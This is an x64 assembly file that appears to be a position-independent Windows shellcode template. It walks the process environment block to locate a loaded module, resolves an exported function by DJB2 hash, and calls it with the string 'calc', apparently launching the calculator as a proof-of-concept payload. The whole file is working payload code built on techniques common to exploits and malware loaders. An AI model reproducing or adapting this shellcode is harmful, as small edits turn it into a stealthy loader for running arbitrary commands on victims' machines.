PUBLIC	?find_function@native@@YAPEAXPEAXI@Z		; native::find_function
PUBLIC	??$r_hash@D@@YAIPEAD@Z				; r_hash<char>
PUBLIC	main

PUBLIC  AlignRSP
_TEXT SEGMENT
	AlignRSP PROC
	push rsi; Preserve RSI since we're stomping on it
	mov  rsi, rsp; Save the value of RSP so it can be restored
	and  rsp, 0FFFFFFFFFFFFFFF0h; Align RSP to 16 bytes
	sub  rsp, 020h; Allocate homing space for ExecutePayload
	call main; Call the entry point of the payload
	mov  rsp, rsi; Restore the original value of RSP
	pop  rsi; Restore RSI
	ret; Return to caller
	AlignRSP ENDP
_TEXT ENDS
_TEXT	SEGMENT
main	PROC
$LN8:
	sub	rsp, 40					; 00000028H
	mov	rax, QWORD PTR gs:[96]
	mov	edx, 698766968				; 29a65678H
	mov	rcx, QWORD PTR [rax+24]
	mov	rax, QWORD PTR [rcx+32]
	mov	rcx, QWORD PTR [rax]
	mov	rcx, QWORD PTR [rcx]
	mov	rcx, QWORD PTR [rcx+32]
	call	?find_function@native@@YAPEAXPEAXI@Z	; native::find_function
	xor	edx, edx
	CALL after_$SG92200
$SG92200 DB	'calc', 00H
after_$SG92200:
	POP  rcx
	call	rax
	xor	eax, eax
	add	rsp, 40					; 00000028H
	ret	0
main	ENDP
_TEXT	ENDS
_TEXT	SEGMENT
str$ = 8
??$r_hash@D@@YAIPEAD@Z PROC				; r_hash<char>, COMDAT
	mov	eax, 5381				; 00001505H
	jmp	SHORT $LN10@r_hash
$LL2@r_hash:
	imul	eax, eax, 33				; 00000021H
	add	eax, edx
$LN10@r_hash:
	movsx	edx, BYTE PTR [rcx]
	inc	rcx
	test	edx, edx
	jne	SHORT $LL2@r_hash
	ret	0
??$r_hash@D@@YAIPEAD@Z ENDP				; r_hash<char>
_TEXT	ENDS
_TEXT	SEGMENT
mod$ = 8
hash$ = 16
?find_function@native@@YAPEAXPEAXI@Z PROC		; native::find_function, COMDAT
$LN23:
	mov	QWORD PTR [rsp+8], rbx
	mov	QWORD PTR [rsp+16], rdi
	movsxd	rax, DWORD PTR [rcx+60]
	xor	r10d, r10d
	mov	ebx, edx
	mov	r8, rcx
	mov	r9d, DWORD PTR [rax+rcx+136]
	add	r9, rcx
	cmp	DWORD PTR [r9+24], r10d
	jbe	SHORT $LN3@find_funct
	mov	edi, DWORD PTR [r9+32]
$LL4@find_funct:
	lea	rax, QWORD PTR [rdi+r10*4]
	mov	ecx, DWORD PTR [rax+r8]
	mov	eax, 5381				; 00001505H
	add	rcx, r8
	jmp	SHORT $LN21@find_funct
$LL8@find_funct:
	imul	eax, eax, 33				; 00000021H
	add	eax, edx
$LN21@find_funct:
	movsx	edx, BYTE PTR [rcx]
	inc	rcx
	test	edx, edx
	jne	SHORT $LL8@find_funct
	cmp	eax, ebx
	je	SHORT $LN13@find_funct
	inc	r10d
	cmp	r10d, DWORD PTR [r9+24]
	jb	SHORT $LL4@find_funct
$LN3@find_funct:
	xor	eax, eax
$LN1@find_funct:
	mov	rbx, QWORD PTR [rsp+8]
	mov	rdi, QWORD PTR [rsp+16]
	ret	0
$LN13@find_funct:
	mov	ecx, DWORD PTR [r9+36]
	add	rcx, r8
	movzx	edx, WORD PTR [rcx+r10*2]
	mov	ecx, DWORD PTR [r9+28]
	add	rcx, r8
	mov	eax, DWORD PTR [rcx+rdx*4]
	add	rax, r8
	jmp	SHORT $LN1@find_funct
?find_function@native@@YAPEAXPEAXI@Z ENDP		; native::find_function
_TEXT	ENDS
END